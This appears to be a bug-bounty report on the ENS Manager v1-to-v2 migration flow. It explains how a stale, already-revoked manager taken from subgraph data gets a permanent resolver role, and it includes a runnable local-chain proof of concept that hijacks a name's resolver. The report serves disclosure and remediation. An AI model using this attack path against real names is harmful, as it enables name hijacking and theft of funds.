# 91765 w a medium stale v1 migration state resurrects a revoked manager on v2

**Submitted on Sep 4th 2026 at 06:29:30 UTC by @Orellasec for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #91765
* **Report Type:** Websites & Apps
* **Report severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Direct theft of user funds
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: - a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker - redirecting the recipient of a name transfer - leaving a name permanently inaccessible after the flow

## Description

## Brief / Summary

The Manager migration flow decides which V1 manager to preserve from the V1 subgraph's domain.owner.id, stores it in the migration plan, and later grants that address permanent V2 ROLE\_SET\_RESOLVER. It never compares the planned manager with current on-chain V1 Registry state immediately before building or submitting the atomic migration batch.

A manager already revoked on V1 can therefore be resurrected as a permanent V2 resolver delegate when the registrant migrates while the subgraph or an already-built preview still contains the old manager. The revived manager can redirect the migrated name to an attacker-controlled resolver/address, causing later transfers sent through that ENS name to be stolen.

## Scope applicability

The vulnerable integration is the explicitly in-scope apps/manager target. Manager directly imports the workspace migration classifier, converts its cached managerAddress into the V2 grant, includes that call in the atomic migration batch, verifies the stale address received the role, and presents the batch to the user without showing the grantee address.

## Vulnerability details / root cause

apps/manager/src/features/migration/service/v1SubgraphClient.ts obtains owner.id and registrant.id from <https://v1-graphql.ens.dev/subgraph>. The bundled workspace classifier in packages/migration/src/service/classifyNames.ts treats the indexed owner as manager whenever it differs from the registrant and stores it as managerAddress.

apps/manager/src/features/migration/service/buildRoleGrantCalls.ts turns the stored address directly into:

```ts
const ROLE_SET_RESOLVER = 1n << 24n
functionName: 'grantRoles',
args: [resource, ROLE_SET_RESOLVER, name.managerAddress]
```

buildAtomicMigrationBatches.ts unconditionally includes that grant and declares the stale grantee as a postcondition. migrationService.ts rechecks approval types, destination readiness, and direct routes, but passes the old classification into the new batch without re-reading live V1 Registry owner(node). verifyAtomicMigrationBatch.ts then verifies that the stale address received the role, treating the unsafe grant as successful migration.

The wallet confirmation UI only says “Approve manager restoration” and “Restore the existing managers for your names”; it does not identify the address receiving permanent authority.

## Attack path

1. Alice is the BaseRegistrar registrant of alice.eth. Mallory was temporarily the V1 Registry owner/manager through a legitimate prior delegation or compromised manager key.
2. Alice opens migration while the V1 subgraph response contains registrant = Alice and owner = Mallory. The plan records managerAddress = Mallory.
3. Alice revokes Mallory by changing the live V1 Registry owner back to Alice. This can occur before the subgraph catches up or after the preview is built. Mallory now has no live V1 authority.
4. Alice continues migration. The execution path never checks live V1 Registry owner(node) against the cached managerAddress.
5. The authorized HCA batch migrates the name and calls V2 ETHRegistry.grantRoles(labelId, ROLE\_SET\_RESOLVER, Mallory).
6. Post-verification checks that Mallory has the role and reports success.
7. Mallory calls setResolver() for alice.eth, points it to a malicious resolver, and sets the ETH address to Mallory. A later transfer sent to alice.eth is delivered to Mallory.

The race is naturally reachable during normal subgraph indexing delay and does not require compromising the subgraph.

## Impact details

ROLE\_SET\_RESOLVER is the exact V2 PermissionedRegistry token role required by setResolver(). The migration transaction creates new permanent V2 authority for an address that the victim already revoked on V1. That address can replace the resolver with attacker-controlled resolution, hijacking the ENS name during a Manager migration and causing direct theft of transfers sent to it.

The executable PoC calls the shipped classifyName and buildRoleGrantCall implementations, executes the resulting exact calldata against real pinned LabelStore and PermissionedRegistry contracts on Anvil, then acts as the revoked manager. The revived account passes the real registry role check and replaces the safe resolver with the attacker resolver.

## Evidence and source identity

Audited application checkout: cda79acaad59711b943fc68207ebb3f1d0ff8596.

* apps/manager/src/features/migration/service/v1SubgraphClient.ts:7,22-47,89-100 reads owner.id and registrant.id from the V1 subgraph.
* apps/manager/src/features/migration/service/classifyNames.ts:1-12 imports/re-exports the bundled workspace classifier.
* packages/migration/src/service/classifyNames.ts:148-184 converts the indexed owner to managerAddress.
* apps/manager/src/features/migration/service/buildRoleGrantCalls.ts:8-25 grants permanent ROLE\_SET\_RESOLVER to managerAddress.
* apps/manager/src/features/migration/service/buildAtomicMigrationBatches.ts:608-624 includes the grant and stale-grantee postcondition.
* apps/manager/src/features/migration/service/migrationService.ts:367-390,886-925 rechecks other conditions but does not re-read V1 ownership before rebuilding/submitting.
* apps/manager/src/features/migration/service/verifyAtomicMigrationBatch.ts:340-353 verifies that the stale address received the role.
* WalletConfirmationStepsDialog.tsx:81-88 hides the grantee behind generic “manager restoration” language.

## Known-issue distinction

QA-01 covers functional errors caused by certain role combinations during transfer. This report is not a follow-up UI/profile error and does not depend on such a combination. Its root is trusting stale indexed/cached V1 authority at the migration authorization boundary, which grants unintended V2 authority. The reproduced consequence is resolver-control resurrection and a migration-time name hijack, an explicitly critical in-scope impact.

## Recommended fix

Immediately before estimating and again before submitting each atomic batch:

1. Read current V1 ENS Registry owner(node) for every selected name.
2. Compare it with the planned managerAddress and registrant.
3. If it differs, abort with MigrationPlanChangedError and require review of a rebuilt plan.
4. Show every name and exact manager address in the confirmation UI.

Prefer deriving manager-restoration calls from the same-block on-chain read. Bind the validation block to simulation/submission or fail closed when state changes.

## Proof of Concept

## Reproduction

This PoC executes the shipped Manager classifier and calldata builder, then executes that exact calldata against the real pinned LabelStore and PermissionedRegistry contracts on a local Anvil chain. It proves the previously revoked manager obtains live V2 ROLE\_SET\_RESOLVER and can replace the safe resolver.

### Prerequisites

* Node.js
* pnpm 10.27.0
* Foundry (anvil)
* The audited monorepo checkout at commit cda79acaad59711b943fc68207ebb3f1d0ff8596 with dependencies installed
* Compiled contracts-v2 PR #409 artifacts at repos/contracts-v2-pr409/contracts/out

Save the following as apps/manager/src/features/migration/service/MGR009RealPoC.test.ts:

```ts
// @vitest-environment node
import { readFileSync } from 'node:fs'
import { resolve } from 'node:path'
import {
  type Abi, type Address, createPublicClient, createWalletClient,
  decodeFunctionData, type Hex, http, labelhash, zeroAddress,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { foundry } from 'viem/chains'
import { describe, expect, it } from 'vitest'

import { ETH_REGISTRY_V2_ABI } from '../contracts/abis'
import { makeDomain } from './_fixtures'
import { buildRoleGrantCall } from './buildRoleGrantCalls'
import { classifyName } from './classifyNames'

type ForgeArtifact = { abi: Abi; bytecode: { object: Hex } }
const artifact = (relativePath: string): ForgeArtifact =>
  JSON.parse(readFileSync(resolve(process.cwd(),
    '../../../contracts-v2-pr409/contracts/out', relativePath), 'utf8')) as ForgeArtifact

const OWNER_KEY = '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80' as Hex
const ATTACKER_KEY = '0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d' as Hex
const ALL_ROLES = 0x1111111111111111111111111111111111111111111111111111111111111111n
const ATTACKER_RESOLVER = '0x3333333333333333333333333333333333333333' as Address
const SAFE_RESOLVER = '0x4444444444444444444444444444444444444444' as Address

describe('ENS-MGR-009 real implementation PoC', () => {
  it('turns a stale indexed manager into live resolver control', async () => {
    const rpcUrl = process.env.MGR009_RPC_URL ?? 'http://127.0.0.1:8545'
    const owner = privateKeyToAccount(OWNER_KEY)
    const attacker = privateKeyToAccount(ATTACKER_KEY)
    const publicClient = createPublicClient({ chain: foundry, transport: http(rpcUrl) })
    const ownerClient = createWalletClient({ account: owner, chain: foundry, transport: http(rpcUrl) })
    const attackerClient = createWalletClient({ account: attacker, chain: foundry, transport: http(rpcUrl) })

    const labelStoreArtifact = artifact('LabelStore.sol/LabelStore.json')
    const registryArtifact = artifact('PermissionedRegistry.sol/PermissionedRegistry.json')

    const labelStoreReceipt = await publicClient.waitForTransactionReceipt({
      hash: await ownerClient.deployContract({
        abi: labelStoreArtifact.abi,
        bytecode: labelStoreArtifact.bytecode.object,
        args: [zeroAddress],
      }),
    })
    expect(labelStoreReceipt.contractAddress).toBeDefined()

    const registryReceipt = await publicClient.waitForTransactionReceipt({
      hash: await ownerClient.deployContract({
        abi: registryArtifact.abi,
        bytecode: registryArtifact.bytecode.object,
        args: [labelStoreReceipt.contractAddress, owner.address, ALL_ROLES],
      }),
    })
    const registry = registryReceipt.contractAddress
    expect(registry).toBeDefined()
    if (!registry) throw new Error('registry deployment failed')

    await publicClient.waitForTransactionReceipt({
      hash: await ownerClient.writeContract({
        address: registry,
        abi: registryArtifact.abi,
        functionName: 'register',
        args: ['alice', owner.address, zeroAddress, SAFE_RESOLVER, ALL_ROLES, 4_000_000_000n],
      }),
    })

    // Stale indexed response: live registry already has Alice as owner and
    // Mallory has no authority, but the response still says owner=Mallory.
    const staleDomain = makeDomain({
      name: 'alice.eth',
      labelName: 'alice',
      registrantId: owner.address,
      ownerId: attacker.address,
      resolverAddress: ATTACKER_RESOLVER,
    })
    const classification = classifyName(staleDomain, owner.address)
    expect(classification?.type).toBe('classified')
    if (classification?.type !== 'classified') throw new Error('stale name was not classified')
    expect(classification.name.managerAddress).toBe(attacker.address)

    // Invoke the shipped Manager calldata builder and execute its exact output
    // against the real pinned PermissionedRegistry.
    const grant = buildRoleGrantCall(classification.name)
    const decodedGrant = decodeFunctionData({ abi: ETH_REGISTRY_V2_ABI, data: grant.data })
    expect(decodedGrant.functionName).toBe('grantRoles')
    await publicClient.waitForTransactionReceipt({
      hash: await ownerClient.sendTransaction({ to: registry, data: grant.data }),
    })

    // The revoked account now passes the real ROLE_SET_RESOLVER check.
    await publicClient.waitForTransactionReceipt({
      hash: await attackerClient.writeContract({
        address: registry,
        abi: registryArtifact.abi,
        functionName: 'setResolver',
        args: [BigInt(labelhash('alice')), ATTACKER_RESOLVER],
      }),
    })
    const resolver = await publicClient.readContract({
      address: registry,
      abi: registryArtifact.abi,
      functionName: 'getResolver',
      args: ['alice'],
    })
    expect(resolver).toBe(ATTACKER_RESOLVER)
  })
})
```

Run from the submission package (or equivalently start Anvil and run the test):

```bash
ANVIL="$(command -v anvil || echo "$HOME/.foundry/bin/anvil")"
"$ANVIL" --silent --port 18546 >/tmp/ens-mgr-009-anvil.log 2>&1 &
ANVIL_PID=$!
trap 'kill "$ANVIL_PID" 2>/dev/null || true' EXIT
cd repos/audit-comp-ens
MGR009_RPC_URL=http://127.0.0.1:18546 npx --yes pnpm@10.27.0 --filter manager exec vitest run \
  src/features/migration/service/MGR009RealPoC.test.ts
```

Expected result:

```
Test Files 1 passed (1)
Tests 1 passed (1)
```

### What the test proves

1. Real pinned LabelStore and PermissionedRegistry contracts are deployed to Anvil.
2. alice is registered with Alice as live owner and a safe resolver; Mallory has no live authority.
3. A stale V1 response naming Mallory is passed into the shipped classifyName implementation, which records Mallory as managerAddress.
4. The shipped buildRoleGrantCall emits grantRoles calldata for Mallory, and that exact calldata is executed against the real registry.
5. Mallory then calls the real registry setResolver function. The role check succeeds and the safe resolver is replaced with the attacker resolver.
6. The final read proves the migrated name now resolves through the attacker-controlled resolver.
